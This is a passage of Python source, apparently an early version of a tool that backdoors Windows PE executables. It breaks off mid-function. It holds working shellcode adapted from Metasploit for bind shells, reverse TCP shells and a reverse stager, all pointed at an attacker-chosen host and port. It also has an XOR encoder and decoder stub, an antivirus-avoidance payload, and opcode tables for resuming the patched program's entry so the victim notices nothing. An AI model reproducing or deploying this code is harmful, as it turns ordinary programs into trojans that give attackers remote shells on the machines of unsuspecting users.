#!/usr/bin/env python
'''
    backdoor.py v0.01

    Author: Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    Special thanks to Travis Morrow.

    Backdoor PE Files
    Copyright 2013 Joshua Pitts

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
    MA 02110-1301, USA.

    Currently supports win32 EXEs/DLLs only (intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers.

'''

import sys
import os
import struct
import shutil
import random
from optparse import OptionParser
import signal
import platform
import stat
import time
from random import choice
import subprocess


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)

#Different Machine Types
MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                '0x8664': 'x64', '0x1c0': 'ARM LE', '0x1c4': 'ARMv7',
                '0xebc': 'EFIByteCode', '0x14c': 'Intel x86',
                '0x200': 'Intel Itanium', '0x9041': 'M32R',
                '0x266': 'MIPS16', '0x366': 'MIPS w/FPU',
                '0x466': 'MIPS16 w/FPU', '0x1f0': 'PowerPC LE',
                '0x1f1': 'PowerPC w/FP', '0x166': 'MIPS LE',
                '0x1a2': 'Hitachi SH3', '0x1a3': 'Hitachi SH3 DSP',
                '0x1a6': 'Hitachi SH4', '0x1a8': 'Hitachi SH5',
                '0x1c2': 'ARM or Thumb -interworking',
                '0x169': 'MIPS little-endian WCE v2'
                }

author = """\
         Author: Joshua Pitts
         Email: the.midnite.runr[a t]gmail<d o t>com
         """

menu = ["-.(`-')  (`-')  _           <-"
        ".(`-') _(`-')                            (`-')\n"
        "__( OO)  (OO ).-/  _         __( OO)"
        "( (OO ).->     .->        .->   <-.(OO )  \n"
        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
        "`------'  `--' `--'   `-----'`--' '--'"
        "`------'    `-----'    `-----' `--' '--' \n"
        "           (`-')  _           (`-')     "
        "              (`-')                    \n"
        "   <-.     (OO ).-/  _        ( OO).-> "
        "      .->   <-.(OO )      .->           \n"
        "(`-')-----./ ,---.   \-,-----./    '._"
        "  (`-')----. ,------,) ,--.'  ,-.        \n"
        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
        "( _) | |  ||  |_.' |(OO \    /         \n"
        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
        " \|  |)|  ||  .   .' |  /   /)         \n"
        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
        " '  '-'  '|  |\  \  `-/   /`          \n"
        "   `--'    `--' `--'   `-----'   `--'    "
        "  `-----' `--' '--'   `--'            \n",

        "__________               "
        " __       .___                   \n"
        "\______   \_____    ____ "
        "|  | __ __| _/____   ___________ \n"
        " |    |  _/\__  \ _/ ___\|"
        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
        " |    |   \ / __ \\\\  \__"
        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
        " |______  /(____  /\___  >"
        "__|_ \____ |\____/ \____/|__|   \n"
        "        \/      \/     \/"
        "     \/    \/                    \n"
        "___________              "
        "__                               \n"
        "\_   _____/____    _____/"
        "  |_  ___________ ___.__.        \n"
        " |    __) \__  \ _/ ___\ "
        "  __\/  _ \_  __ <   |  |        \n"
        " |     \   / __ \\\\  \__"
        "_|  | (  <_> )  | \/\___  |        \n"
        " \___  /  (____  /\___  >_"
        "_|  \____/|__|   / ____|        \n"
        "     \/        \/     \/  "
        "                 \/             \n"]

# A couple NOPs from playing with the debugger
nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]

#this data block is a mapping of x86 intel (from windows) opcodes and their
#entire length.  For reconstructing an exe it doesn't matter as much what
#the value of the instructions are as it matters first the length in bytes.

op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
            '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
            '0x0108': 2, '0x0109': 2, '0x010a': 2, '0x010b': 2,
            '0x010c': 3, '0x010d': 6, '0x010e': 2, '0x010f': 2,
            '0x0110': 2, '0x0111': 2, '0x0112': 2, '0x0113': 2,
            '0x0114': 3, '0x0115': 6, '0x0116': 2, '0x0117': 2,
            '0x0118': 2, '0x0119': 2, '0x011a': 2, '0x011b': 2,
            '0x011c': 3, '0x011d': 6, '0x011e': 2, '0x011f': 2,
            '0x0120': 2, '0x0121': 2, '0x0122': 2, '0x0123': 2,
            '0x0124': 3, '0x0125': 6, '0x0126': 2, '0x0127': 2,
            '0x0128': 2, '0x0129': 2, '0x012a': 2, '0x012b': 2,
            '0x012c': 3, '0x012d': 6, '0x012e': 2, '0x012f': 2,
            '0x0130': 2, '0x0131': 2, '0x0132': 2, '0x0133': 2,
            '0x0134': 3, '0x0135': 6, '0x0136': 2, '0x0137': 2,
            '0x0138': 2, '0x0139': 2, '0x013A': 2, '0x013b': 2,
            '0x013c': 3, '0x013d': 6, '0x013e': 2, '0x013f': 2,
            '0x0140': 2, '0x0141': 3, '0x0142': 3, '0x0143': 3,
            '0x0144': 4, '0x0145': 3, '0x0146': 3, '0x0147': 3,
            '0x0148': 3, '0x0149': 3, '0x014a': 3, '0x014b': 3,
            '0x014c': 4, '0x014d': 3, '0x014e': 3, '0x014f': 3,
            '0x0150': 3, '0x0151': 3, '0x0152': 3, '0x0153': 3,
            '0x0154': 4, '0x0155': 3, '0x0156': 3, '0x0157': 3,
            '0x0158': 3, '0x0159': 3, '0x015a': 3, '0x015b': 3,
            '0x015c': 4, '0x015d': 3, '0x015e': 3, '0x015f': 3,
            '0x0160': 3, '0x0161': 3, '0x0162': 3, '0x0163': 3,
            '0x0164': 4, '0x0165': 3, '0x0166': 3, '0x0167': 3,
            '0x0168': 3, '0x0169': 3, '0x016a': 3, '0x016b': 3,
            '0x016c': 4, '0x016d': 3, '0x016e': 3, '0x016f': 3,
            '0x0170': 3, '0x0171': 3, '0x0172': 3, '0x0173': 3,
            '0x0174': 4, '0x0175': 3, '0x0176': 3, '0x0177': 3,
            '0x0178': 3, '0x0179': 3, '0x017a': 3, '0x017b': 3,
            '0x017c': 4, '0x017d': 3, '0x017e': 3, '0x017f': 3,
            '0x0180': 6, '0x0181': 6, '0x0182': 6, '0x0183': 6,
            '0x0184': 7, '0x0185': 6, '0x0186': 6, '0x0187': 6,
            '0x0188': 6, '0x0189': 6, '0x018a': 6, '0x0184': 6,
            '0x018c': 7, '0x018d': 6, '0x018e': 6, '0x018f': 6,
            '0x0190': 6, '0x0191': 6, '0x0192': 6, '0x0193': 6,
            '0x0194': 7, '0x0195': 6, '0x0196': 6, '0x0197': 6,
            '0x0198': 6, '0x0199': 6, '0x019a': 6, '0x019b': 6,
            '0x019c': 7, '0x019d': 6, '0x019e': 6, '0x019f': 6,
            '0x01a0': 6, '0x01a1': 6, '0x01a2': 6, '0x01a3': 6,
            '0x01a4': 7, '0x01a5': 6, '0x01a6': 6, '0x01a7': 6,
            '0x01a8': 6, '0x01a9': 6, '0x01aa': 6, '0x01ab': 6,
            '0x01ac': 7, '0x01ad': 6, '0x01ae': 6, '0x01af': 6,
            '0x01b0': 6, '0x01b1': 6, '0x01b2': 6, '0x01b3': 6,
            '0x01b4': 7, '0x01b5': 6, '0x01b6': 6, '0x01b7': 6,
            '0x01b8': 6, '0x01b9': 6, '0x01ba': 6, '0x01bb': 6,
            '0x01bc': 7, '0x01bd': 6, '0x01be': 6, '0x01bf': 6,
            '0x01c0': 2, '0x01c1': 2, '0x01c2': 2, '0x01c3': 2,
            '0x01c4': 2, '0x01c5': 2, '0x01c6': 2, '0x01c7': 2,
            '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
            '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
            '0x0f34': 2,
            '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
            '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
            '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
            '0x4c': 1, '0x4d': 1, '0x4e': 1, '0x4f': 1,
            '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
            '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
            '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
            '0x5c': 1, '0x5d': 2, '0x5e': 1, '0x5f': 1,
            '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
            '0x6203': 2,
            '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
            '0x6208': 2, '0x6209': 2, '0x6200a': 2, '0x620b': 2,
            '0x620c': 3,
            '0x6a': 2,
            '0x70': 2, '0x71': 2, '0x72': 2, '0x73': 2,
            '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
            '0x78': 2,
            '0x79': 2, '0x8001': 3, '0x8002': 3,
            '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0xeb': 2, '0x8be5': 2,
            '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
            '0x8965': 3, '0xFF15': 6, '0x8b4e': 3, '0x8b46': 3,
            '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
            '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
            '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2,
            '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
            '0x33c0': 2, '0x33c9': 2,
            '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
            '0xe8': 5, '0x68': 5, '0xe9': 5,
            '0xbf': 5, '0xbe': 5,
            '0xcc': 1,
            '0xffd3': 2,
            '0x33f6': 2,
            '0x895c24': 4, '0x8da424': 7,
            '0xa1': 5, '0xc3': 1
            }


def ones_compliment():
    """
    Function for finding two random 4 byte numbers that make
    a 'ones compliment'
    """
    compliment_you = random.randint(1, 4228250625)
    compliment_me = int('0xFFFFFFFF', 16) - compliment_you
    if verbose is True:
        print "First ones compliment:", hex(compliment_you)
        print "2nd ones compliment:", hex(compliment_me)
        print "'AND' the compliments (0): ", compliment_you & compliment_me
    compliment_you = struct.pack('<I', compliment_you)
    compliment_me = struct.pack('<I', compliment_me)
    return compliment_you, compliment_me


def ByteToHex(byteStr):
    """
    Convert a byte string to it's hex string representation e.g. for output.
    """

    return ''.join(["%02X" % ord(x) for x in byteStr]).strip()


class Encoders():
    """
    This class contains the encoding functions for
    shellcode and the decoding stubs live.
    """

    def __init__(self, encoder, shellcode):
        self.shellcode = shellcode

    def encode_xor(self):
        """
        Simple XOR Encoder, random each run.
        """
        XOR = random.randint(1, 255)
        b = bytearray(self.shellcode)
        for i in range(len(b)):
            b[i] ^= XOR
        decoder = "\x90\xe8\x00\x00\x00\x00"  # call current address
        decoder += "\x59"  # pop ecx
        decoder += "\x8b\xc1"  # mov eax,ecx
        decoder += "\x83\xc0\x18"  # add eax, (the end of the decoder)
        decoder += "\x81\xC1"  # add ECX
        decoder += struct.pack('<i', len(b)+24)
        decoder += "\x80\x30"
        decoder += struct.pack("<B", XOR)
        decoder += "\x40"
        decoder += "\x3b\xc1"
        decoder += "\x7e\xf8"
        decoder += "\x90\x90\x90\x90"
        decoder = bytearray(decoder)
        encoded_package = decoder+b
        return encoded_package


class Shellcodes():
    """
    This class contains all the available shellcodes that
    are available for use.
    You can add your own, make sure you feed it ports/hosts as needed.
    Just follow the provided examples.
    """

    def __init__(self, HOST="127.0.0.1", PORT=443):
        self.HOST = HOST
        self.PORT = PORT
        if HOST != '':
            hostocts = []
            for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
            self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                      hostocts[2], hostocts[3])

    def bind_shell_tcp(self):
        """
        Modified metasploit windows/shell_bind_tcp shellcode
        to enable continued Execution.
        """

        "windows/shell_bind_tcp - 341 bytes"
        shellcode = ("\x90\x90\x60\x9c"  # added this preserves stack
                "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                "\x31\xdb\x53\x68\x02\x00")
        shellcode += struct.pack('!h', self.PORT)  # PORT
        shellcode += ("\x89\xe6\x6a\x10\x56\x57\x68"
                "\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5"
                "\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7\x68\x75"
                "\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
                "\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
                "\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e"
                "\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x90"
                "\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56"
                "\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
                "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 200 (To align the stack)
                "\x9d\x61")  # restore the stack

        return shellcode

    def reverse_shell_tcp(self):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued Execution.
        """

        if self.HOST == "":
            print "ERROR: Must set a host for reverse connections (-i)."
            sys.exit(1)

        shellcode = ("\x90\x90\x60\x9c"  # added this preserves stack
                "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                "\x68")
        shellcode += self.hostip  # IP
        shellcode += ("\x68\x02\x00")
        shellcode += struct.pack('!h', self.PORT)  # PORT
        shellcode += ("\x89\xe6\x6a\x10\x56"
                "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                #The NOP in the line below allows for continued execution.
                "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 1FC (To align the stack)
                "\x9d\x61")  # restore the stack 

        return shellcode

    def reverse_stager(self):
        """
        There is no continuation of EXE from the this shellcode.
        I'm guessing the incoming stage will need to modified to continue
        execution.
        """

        if self.HOST == "":
            print "ERROR: Must set a host for reverse connections (-i)."
            sys.exit(1)

        shellcode=("\x90\x90\x60\x9c"  # added this preserves stack
                "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
                "\x05\x68")
        shellcode += self.hostip  # IP
        shellcode += ("\x68\x02\x00")
        shellcode += struct.pack('!h', self.PORT)  # PORT
        shellcode += ("\x89\xe6\x6a\x10"
                "\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
                "\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
                "\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
                "\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
                "\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
                "\x85\xf6\x75\xec\xc3"
                "\x81\xc4\x00\x02\x00\x00"  # ADD ESP 200 (To align the stack)
                "\x9d\x61")  # restore the stack

        return shellcode

    def custom_shellcode(self, title=r"Oh Hai", msg=r"Hi from BDF."):
        """
        Staple Msg_box from metasploit
        Title max length 16 characters
        MSG max length 19 characters
        """
        if len(title) > 16:
            print "Title must be 16 characters or less"
            sys.exit(1)
        if len(msg) > 19:
            print "Message must be 19 characters or less"
            sys.exit(1)
        title = title[::-1]
        msg = msg[::-1]
        length_title = len(title)
        length_msg = len(msg)
        stackpreserve = "\x90\x90\x60\x9c"  # added this preserves stack
        msg_box = ("\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
                "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
                "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
                "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
                "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
                "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
                "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
                "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
                "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
                "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
                "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
                "\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
                "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
                "\xe8\x61\xff\xff\xff")
        remainder_title = len(title) % 4
        if remainder_title == 0:
            pass
        else:
            msg_box += "\x68"
            msg_box += title[:remainder_title][::-1]
            msg_box += "\x58"+"\x20" * int(3 - remainder_title)
            title = title[remainder_title:]
        newtitle = ''

        j = 1
        for i, char in enumerate(title):
            newtitle += char
            if (i+1) % 4 == 0:
                msg_box += "\x68"
                msg_box += newtitle[::-1]
                newtitle = ''
                j = 1
                continue
            elif i == len(title) - 1:
                msg_box += "\x68"
                msg_box += newtitle[::-1]
                msg_box += ("\x20"*(4-j))
            j += 1
        msg_box += "\x31\xdb"
        msg_box += "\x88\x5c\x24"
        msg_box += struct.pack('=B', length_title)
        msg_box += "\x89\xe3"
        msg_box += "\x68"
        remainder_msg = len(msg) % 4
        if remainder_msg == 0:
            msg_box += "\x58"+"\x20"*3
        else:
            msg_box += msg[:remainder_msg][::-1]
            msg_box += "\x20" * int(3 - remainder_msg) + "\x58"
            msg = msg[remainder_msg:]
        newmsg = ''
        j = 1
        for i, char in enumerate(msg):
            newmsg += char
            if (i+1) % 4 == 0:
                msg_box += "\x68"
                msg_box += newmsg[::-1]
                newmsg = ''
                j = 1
                continue
            elif i == len(msg) - 1:
                msg_box += "\x68"
                msg_box += "\x20"*(4-j)
                msg_box += newmsg[::-1]
            j += 1
        msg_box += "\x31\xc9"
        msg_box += "\x88\x4c\x24"
        msg_box += struct.pack('=B', length_msg)
        msg_box += "\x89\xe1\x31\xd2\x52\x53"
        msg_box += "\x51\x52\xff\xd0\x31\xc0\x50\x90"
        # ADD ESP 70 <-Need to figure out a way to calculate this on the fly
        stackrestore = "\x81\xc4\x70\x00\x00\x00"
        stackrestore += "\x9d\x61"  # restore the stack

        shellcode = stackpreserve+msg_box+stackrestore
        return shellcode

    def av_test(self):
        """
        A reverse_shell_tcp from metasploit for use in demos for av
        avoidance.
        """

        if self.HOST == "":
            print "ERROR: Must set a host for reverse connections (-i)."
            sys.exit(1)

        shellcode = ("\x90\x90\x60\x9c"  # added this preserves stack
                "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                "\x68")
        shellcode += self.hostip  # IP
        shellcode += ("\x68\x02\x00")
        shellcode += struct.pack('!h', self.PORT)  # PORT
        shellcode += ("\x89\xe6\x6a\x10\x56"
                "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                #The NOP in the line below allows for continued execution.
                "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 1FC (To align the stack)
                "\x9d\x61")  # restore the stack 

        return shellcode


def pe32_entry_instr(TrackingAddress, fileItems):
    """
    This fuction returns a list called ImpList that tracks the first
    couple instructions for reassembly after the shellcode executes.
    If there are pe entry instructions that are not mapped here,
    please send me the first 15 bytes (3 to 4 instructions on average)
    for the executable entry point once loaded in memory.  If you are
    familiar with olly/immunity it is the first couple instructions
    when the program is first loaded.
    """

    #for i, byte in enumerate(initial_instr_set):
    #    print i, ByteToHex(byte)
    f.seek(fileItems['LocOfEntryinCode'])

    count = 0
    loop_count = 0
    ImpList = []
    while True:
        InstrSets = {}

        found_value = False
        for i in range(1, 5):
            f.seek(fileItems['LocOfEntryinCode'] + count)
            CurrRVA = fileItems['VirtualStartingPoint'] + count
            #print 'Upper count', count
            if i == 1:
                CurrInstr = struct.unpack('!B', f.read(i))[0]
                #print i, hex(CurrInstr)
            elif i == 2:
                CurrInstr = struct.unpack('!H', f.read(i))[0]
                #print i, hex(CurrInstr)
            elif i == 3:
                CurrInstr = struct.unpack('!BBB', f.read(i))[0]
                #print i, hex(CurrInstr)
            elif i == 4:
                CurrInstr = struct.unpack('!I', f.read(i))[0]
                # print i, hex(CurrInstr)
            if hex(CurrInstr) in op_codes:
                found_value = True
                #print "length:", op_codes[hex(CurrInstr)]
                instr_length = op_codes[hex(CurrInstr)] - i
                #print "instr_length",instr_length
                if instr_length == 5:
                    InstrSets[CurrInstr] = (struct.unpack('<BBBBB',
                                            f.read(5))[0])
                if instr_length == 4:
                    InstrSets[CurrInstr] = struct.unpack('<I', f.read(4))[0]
                if instr_length == 3:
                    InstrSets[CurrInstr] = struct.unpack('<BBB', f.read(3))[0]
                if instr_length == 2:
                    InstrSets[CurrInstr] = struct.unpack('<H', f.read(2))[0]
                if instr_length == 1:
                    InstrSets[CurrInstr] = struct.unpack('<B', f.read(1))[0]
                if instr_length == 0:
                    InstrSets[CurrInstr] = 0

                TrackingAddress = TrackingAddress + op_codes[hex(CurrInstr)]
                CallValue = (InstrSets[CurrInstr] +
                             fileItems['VirtualStartingPoint'] +
                             op_codes[hex(CurrInstr)])
                ImpList.append([CurrRVA, InstrSets,
                                CallValue, TrackingAddress,
                                instr_length])
                #print ImpList
                #print count, op_codes[hex(CurrInstr)]
